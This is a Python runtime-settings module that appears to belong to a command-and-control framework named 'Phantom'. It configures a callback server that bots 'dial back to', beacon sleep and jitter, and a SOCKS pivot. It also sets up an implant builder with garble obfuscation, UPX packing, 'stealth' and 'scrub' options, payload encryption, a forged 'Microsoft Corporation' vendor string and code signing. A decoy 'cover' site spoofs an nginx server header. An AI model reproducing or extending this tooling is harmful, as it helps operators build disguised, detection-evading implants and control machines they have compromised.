"""Runtime settings: config.yaml defaults, overridden by environment variables.

Everything Coolify needs is driven by env vars so the image stays portable.
"""

import os
import secrets
import socket
import ipaddress
from pathlib import Path

import yaml

BASE = Path(__file__).resolve().parent
ROOT = BASE.parent

DEFAULT_PSK = "9f2c1e7a4b6d8035c1a94f2e7b0d6c3a5e8f1b2d4c7a9036e5f8b1c2d4a70639"


def _bool(v, default=False):
    if v is None:
        return default
    return str(v).strip().lower() in ("1", "true", "yes", "on")


def _yaml() -> dict:
    path = os.environ.get("PHANTOM_CONFIG", str(BASE / "config.yaml"))
    try:
        with open(path, "r", encoding="utf-8") as fh:
            return yaml.safe_load(fh) or {}
    except FileNotFoundError:
        return {}


def data_dir() -> Path:
    d = Path(os.environ.get("PHANTOM_DATA", str(BASE / "data"))).resolve()
    d.mkdir(parents=True, exist_ok=True)
    return d


def psk_hex() -> str:
    env = os.environ.get("PHANTOM_PSK", "").strip()
    if env:
        return env
    store = data_dir() / "psk"
    if store.exists():
        val = store.read_text().strip()
        if len(val) == 64:
            return val
    val = DEFAULT_PSK if _bool(os.environ.get("PHANTOM_DEFAULT_PSK"), False) else secrets.token_hex(32)
    store.write_text(val)
    try:
        os.chmod(store, 0o600)
    except OSError:
        pass
    return val


def load() -> dict:
    raw = _yaml()
    server = raw.get("server") or {}
    tls = server.get("tls") or {}
    builder = dict(raw.get("builder") or {})
    socks = dict(raw.get("socks") or {})
    beacon = dict(raw.get("beacon") or {})
    data = data_dir()

    builds = Path(os.environ.get("PHANTOM_BUILDS", str(builder.get("output_dir") or data / "builds"))).resolve()
    builds.mkdir(parents=True, exist_ok=True)

    tls_env = os.environ.get("PHANTOM_TLS", "").strip().lower()
    if tls_env in ("1", "true", "on", "yes"):
        tls_on = True
    elif tls_env in ("0", "false", "off", "no"):
        tls_on = False
    else:
        tls_on = _bool(tls.get("enabled"), False)

    auth = os.environ.get("PHANTOM_AUTH", "").strip()
    auth_user = auth_pass = ""
    if ":" in auth:
        auth_user, auth_pass = auth.split(":", 1)

    builder.update({
        "output_dir": str(builds),
        "go_bin": os.environ.get("PHANTOM_GO", builder.get("go_bin", "go")),
        "garble": _bool(os.environ.get("PHANTOM_GARBLE"), _bool(builder.get("garble"), False)),
        "upx": _bool(os.environ.get("PHANTOM_UPX"), _bool(builder.get("upx"), False)),
        "public_url": os.environ.get("PHANTOM_PUBLIC_URL", builder.get("public_url", "")),
        "vendor": os.environ.get("PHANTOM_VENDOR", builder.get("vendor", "Microsoft Corporation")),
        "randomize": _bool(os.environ.get("PHANTOM_RANDOMIZE"),
                           _bool(builder.get("randomize"), True)),
        "scrub": _bool(os.environ.get("PHANTOM_SCRUB"), _bool(builder.get("scrub"), True)),
        "pad": _bool(os.environ.get("PHANTOM_PAD"), _bool(builder.get("pad"), True)),
        "stealth": os.environ.get("PHANTOM_STEALTH", builder.get("stealth", "auto")),
        "workers": int(os.environ.get("PHANTOM_WORKERS", builder.get("workers", 4))),
        "encrypt_payload": _bool(os.environ.get("PHANTOM_ENCRYPT"),
                                 _bool(builder.get("encrypt_payload"), True)),
        "metadata": _bool(os.environ.get("PHANTOM_METADATA"),
                          _bool(builder.get("metadata"), True)),
        "sign_pfx": os.environ.get("PHANTOM_SIGN_PFX", builder.get("sign_pfx", "")),
        "sign_pass": os.environ.get("PHANTOM_SIGN_PASS", builder.get("sign_pass", "")),
    })

    return {
        "host": os.environ.get("PHANTOM_HOST", server.get("host", "0.0.0.0")),
        "port": int(os.environ.get("PHANTOM_PORT") or os.environ.get("PORT") or server.get("port", 8000)),
        "tls": {
            "enabled": tls_on,
            "cert": os.environ.get("PHANTOM_CERT", str(BASE / tls.get("cert", "certs/server.crt"))),
            "key": os.environ.get("PHANTOM_KEY", str(BASE / tls.get("key", "certs/server.key"))),
        },
        "psk_hex": psk_hex(),
        "beacon": {
            "default_sleep": int(beacon.get("default_sleep", 3)),
            "default_jitter": int(beacon.get("default_jitter", 20)),
        },
        "builder": builder,
        "socks": {
            "host": os.environ.get("PHANTOM_SOCKS_HOST", socks.get("host", "127.0.0.1")),
            "port": int(os.environ.get("PHANTOM_SOCKS_PORT", socks.get("port", 1080))),
            "enabled": _bool(os.environ.get("PHANTOM_SOCKS"), _bool(socks.get("enabled"), True)),
            "session": socks.get("session", ""),
        },
        "auth": {"user": auth_user, "pass": auth_pass},
        "public_url": os.environ.get("PHANTOM_PUBLIC_URL", "").rstrip("/"),
        "cover": {
            "url": os.environ.get("PHANTOM_COVER", (raw.get("cover") or {}).get("url", "")).strip(),
            "server": os.environ.get("PHANTOM_SERVER",
                                     (raw.get("cover") or {}).get("server", "nginx")),
        },
        "data_dir": str(data),
    }


def lan_ips() -> list:
    """Best-effort list of this host's non-loopback IPv4 addresses."""
    found = []
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            found.append(info[4][0])
    except OSError:
        pass
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            found.append(s.getsockname()[0])
    except OSError:
        pass
    out = []
    for ip in found:
        try:
            if ipaddress.ip_address(ip).is_loopback:
                continue
        except ValueError:
            continue
        if ip not in out:
            out.append(ip)
    return out


def public_url(cfg: dict, request=None) -> str:
    """Resolve the callback URL bots should dial back to."""
    if cfg.get("public_url"):
        return cfg["public_url"]
    if request is not None:
        proto = (request.headers.get("x-forwarded-proto") or request.url.scheme).split(",")[0].strip()
        host = (request.headers.get("x-forwarded-host")
                or request.headers.get("host")
                or request.url.netloc)
        host = host.split(",")[0].strip()
        if host and not host.startswith(("127.0.0.1", "localhost", "0.0.0.0", "[::1]")):
            return f"{proto}://{host}"
    if cfg.get("tls", {}).get("enabled"):
        ips = lan_ips()
        return f"https://{ips[0] if ips else '127.0.0.1'}:{cfg['port']}"
    ips = lan_ips()
    return f"http://{ips[0] if ips else '127.0.0.1'}:{cfg['port']}"
